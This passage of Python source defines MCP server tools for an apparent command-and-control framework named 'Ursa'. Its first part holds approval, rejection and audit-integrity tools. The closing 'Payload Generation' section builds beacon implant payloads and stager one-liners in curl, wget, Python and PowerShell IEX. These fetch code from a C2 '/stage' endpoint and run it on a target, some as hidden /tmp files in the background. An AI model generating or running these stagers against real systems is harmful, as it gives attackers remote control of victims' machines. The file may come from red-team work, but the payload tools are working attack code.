    return "\n".join(lines)


@mcp_server.tool()
def ursa_approve(approval_id: str, note: str = "") -> str:
    """
    Approve a pending request and queue its original task.

    Args:
        approval_id: Approval request ID
        note: Optional decision note
    """
    result = process_approval_decision(
        approval_id=approval_id,
        approved=True,
        actor="mcp:ursa_approve",
        note=note,
    )
    if result["status"] == "not_found":
        return f"Approval {approval_id} not found."
    if result["status"] == "already_resolved":
        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
    if result["status"] == "error":
        return f"Approval {approval_id} could not be updated."
    if result.get("queue_result") != "queued":
        return f"Approval {approval_id} recorded, but task was not queued."
    return f"Approval {approval_id} approved. Task queued: {result.get('task_id')}"


@mcp_server.tool()
def ursa_reject(approval_id: str, note: str = "") -> str:
    """
    Reject a pending approval request.

    Args:
        approval_id: Approval request ID
        note: Optional reason for rejection
    """
    result = process_approval_decision(
        approval_id=approval_id,
        approved=False,
        actor="mcp:ursa_reject",
        note=note,
    )
    if result["status"] == "not_found":
        return f"Approval {approval_id} not found."
    if result["status"] == "already_resolved":
        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
    if result["status"] == "error":
        return f"Approval {approval_id} could not be updated."
    return f"Approval {approval_id} rejected."


@mcp_server.tool()
def ursa_approve_campaign(
    campaign: str,
    tag: str | None = None,
    risk_level: str | None = None,
    note: str = "",
) -> str:
    """
    Approve all pending requests for a campaign/tag filter.

    Args:
        campaign: Campaign name to filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
        note: Optional audit note.
    """
    summary = process_bulk_approval_decisions(
        approved=True,
        actor="mcp:ursa_approve_campaign",
        note=note,
        campaign=campaign.strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=500,
    )
    return (
        f"Bulk approve complete.\n"
        f"Matched: {summary['matched']}\n"
        f"Approved: {summary['approved']}\n"
        f"Failed: {summary['failed']}\n"
        f"Already resolved: {summary['already_resolved']}"
    )


@mcp_server.tool()
def ursa_reject_campaign(
    campaign: str,
    tag: str | None = None,
    risk_level: str | None = None,
    note: str = "",
) -> str:
    """
    Reject all pending requests for a campaign/tag filter.

    Args:
        campaign: Campaign name to filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
        note: Optional audit note.
    """
    summary = process_bulk_approval_decisions(
        approved=False,
        actor="mcp:ursa_reject_campaign",
        note=note,
        campaign=campaign.strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=500,
    )
    return (
        f"Bulk reject complete.\n"
        f"Matched: {summary['matched']}\n"
        f"Rejected: {summary['rejected']}\n"
        f"Failed: {summary['failed']}\n"
        f"Already resolved: {summary['already_resolved']}"
    )


@mcp_server.tool()
def ursa_audit_integrity(limit: int = 50) -> str:
    """
    Verify immutable audit chain integrity and show recent audit events.

    Args:
        limit: Number of recent events to show after verification
    """
    check = verify_immutable_audit_chain()
    rows = get_immutable_audit(limit=limit)
    status_line = (
        f"Audit chain integrity: OK ({check['checked']} events checked)"
        if check["ok"]
        else f"Audit chain integrity: FAILED at {check['failed_event']} after {check['checked']} checks"
    )
    if not rows:
        return status_line + "\nNo immutable audit events."
    lines = [status_line, "", "Recent immutable events:"]
    for row in rows[: min(limit, 20)]:
        lines.append(
            f"[{_format_time(row['timestamp'])}] {row['actor']} {row['action']} "
            f"risk={row['risk_level']} result={row['policy_result']}"
        )
    return "\n".join(lines)


# ── Payload Generation ──


@mcp_server.tool()
def ursa_generate(
    c2_url: str | None = None,
    interval: int = 5,
    jitter: float = 0.1,
    output_format: str = "python",
) -> str:
    """
    Generate a beacon payload configured for your C2 server.

    Args:
        c2_url: The C2 server URL (e.g., http://10.0.0.1:8443).
                Auto-detects if not provided.
        interval: Beacon interval in seconds (default 5)
        jitter: Jitter factor 0.0-1.0 (default 0.1)
        output_format: Output format — "python" for full script,
                       "oneliner" for a one-line command
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:8443"

    if output_format == "oneliner":
        return (f"python3 -c \"$(curl -s {c2_url}/stage)\" "
                f"--server {c2_url} --interval {interval} --jitter {jitter}")

    # Read the beacon source
    beacon_path = PROJECT_ROOT / "implants" / "beacon.py"
    if not beacon_path.exists():
        return "Beacon source not found at implants/beacon.py"

    lines = [
        "Ursa Beacon Payload Generated",
        f"C2:       {c2_url}",
        f"Interval: {interval}s",
        f"Jitter:   {jitter}",
        "",
        "Deploy command:",
        f"  python3 beacon.py --server {c2_url} --interval {interval} --jitter {jitter}",
        "",
        "One-liner (curl + exec):",
        f"  curl -s {c2_url}/stage | python3 - --server {c2_url}",
        "",
        f"Beacon source is at: {beacon_path}",
        "Copy it to the target and run with the deploy command above.",
    ]

    return "\n".join(lines)


@mcp_server.tool()
def ursa_stager(c2_url: str | None = None) -> str:
    """
    Generate stager one-liners for different platforms.

    The stager downloads and runs the full beacon from the C2 /stage endpoint.

    Args:
        c2_url: C2 server URL. Auto-detects if not set.
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:8443"

    lines = [
        f"URSA STAGER ONE-LINERS → {c2_url}",
        "",
        "[Python — cross-platform]",
        f"python3 -c \"import urllib.request,os,tempfile,subprocess;"
        f"d=urllib.request.urlopen('{c2_url}/stage').read();"
        f"f=tempfile.NamedTemporaryFile(suffix='.py',delete=False);"
        f"f.write(d);f.close();"
        f"subprocess.Popen(['python3',f.name,'--server','{c2_url}'])\"",
        "",
        "[Bash + curl]",
        f"curl -s {c2_url}/stage -o /tmp/.u.py && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "[PowerShell]",
        f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('{c2_url}/stage')\"",
        "",
        "[wget]",
        f"wget -qO /tmp/.u.py {c2_url}/stage && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "NOTE: Ensure the C2 server is running (ursa_start_c2) before deploying.",
    ]

    return "\n".join(lines)


if __name__ == "__main__":
    mcp_server.run()
